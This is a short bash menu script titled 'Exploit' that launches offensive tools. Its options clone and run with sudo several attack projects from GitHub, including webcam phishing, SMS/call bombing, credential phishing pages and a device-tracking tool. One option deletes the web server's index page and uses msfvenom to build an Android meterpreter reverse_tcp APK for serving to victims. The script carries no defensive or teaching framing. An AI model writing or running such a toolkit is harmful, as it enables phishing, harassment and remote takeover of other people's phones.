#!/bin/bash

figlet "Exploit"

echo "press 1 to start scanning"
echo "press 2 to start camphishing"
echo "press 3 to start bombing"
echo "press 4 to start zphishing"
echo "press 5 to start stormbeaker"
echo "press 6 to start Android-hac"
echo "press Q to exit"

echo -n "choose ->"
read x

if [ $x == 1 ]; then
echo "you selected 1st option"

read -p "enter ip-address" ip
echo "your ip ->" $ip

sudo nmap $ip
./nn.sh

elif [ $x == 2 ];then
echo "you selected 2nd option"
sudo git clone https://github.com/techchipnet/CamPhish
cd CamPhish
sudo chmod 777 camphish.sh
sudo ./camphish.sh

elif [ $x == 3 ]; then
echo "you selected 3rd option"
sudo git clone https://github.com/TheSpeedX/TBomb.git
cd TBomb
sudo chmod 777 TBomb.sh
sudo ./TBomb.sh


elif [ $x == 4 ]; then
echo "you selected 4th option"
sudo git clone --depth=1 https://github.com/htr-tech/zphisher.git
cd zphisher
sudo chmod 777 zphisher.sh
sudo ./zphisher.sh


elif [ $x == 5 ]; then
echo "you selected 5th option"
sudo git clone https://github.com/ultrasecurity/Storm-Breaker
cd Storm-Breaker/
sudo python3 st.py

elif [ $x == 6 ]; then
echo "you selected 6th option"
sudo service apache2 start
cd /var/www/html
sudo rm -rf index.html
sudo touch execute.apk
read -p "enter ip-address" ip
echo "your ip ->" $ip
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -o execute.apk

elif [ $x == 'Q' ]; then
exit

else 
 echo "wrong way"

 fi
